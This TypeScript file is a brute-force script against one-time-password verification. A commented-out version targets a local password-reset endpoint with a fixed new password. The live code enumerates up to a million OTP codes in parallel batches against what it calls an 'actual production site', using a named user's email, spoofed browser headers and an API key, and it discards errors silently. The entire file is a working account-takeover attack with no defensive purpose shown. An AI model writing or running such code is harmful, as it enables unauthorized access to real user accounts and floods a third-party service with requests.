// import axios from "axios";

// async function GetOtp(otp: number) {

// let data = JSON.stringify({
//   "email": "admin@gmail.com",
//   "otp": otp,
//   "newPassword": "111111"
// });

// let config = {
//   method: 'post',
//   maxBodyLength: Infinity,
//   url: 'http://localhost:3000/reset-password',
//   headers: {
//     'Content-Type': 'application/json'
//   },
//   data : data
// };

// try {
//     await axios.request(config)
// } catch (error) {

// }
// }

// async function main() {
//     for (let i = 0; i < 1000000; i+=100) {
//       const promises = [];
//       console.log("here for " + i);
//       for (let j = 0; j < 100; j++) {
//         promises.push(GetOtp(i + j))
//       }
//       await Promise.all(promises);
//     }
//   }

//   main()


// acctual production site :

import axios from "axios";

async function GetOtp(otp: number) {
  let config = {
    method: "get",
    maxBodyLength: Infinity,
    url: `https://harkiratapi.classx.co.in/get/otpverify?useremail=rudrapanigrahy2222%40gmail.com&otp=${otp}`,
    headers: {
      Accept: "*/*",
      "Sec-Fetch-Site": "same-site",
      "Accept-Language": "en-IN,en-GB;q=0.9,en;q=0.8",
      "Sec-Fetch-Mode": "cors",
      "Accept-Encoding": "gzip, deflate, br",
      Origin: "https://harkirat.classx.co.in",
      "User-Agent":
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
      Referer: "https://harkirat.classx.co.in/",
      Connection: "keep-alive",
      Host: "harkiratapi.classx.co.in",
      "Sec-Fetch-Dest": "empty",
      "Auth-Key": "appxapi",
      "Client-Service": "Appx",
      source: "website",
      "Device-Type": "",
    },
  };

  try {
    await axios.request(config);
  } catch (error) {}
}

async function main() {
  for (let i = 0; i < 1000000; i += 100) {
    const promises = [];
    console.log("here for " + i);
    for (let j = 0; j < 100; j++) {
      promises.push(GetOtp(i + j));
    }
    await Promise.all(promises);
  }
}

main();
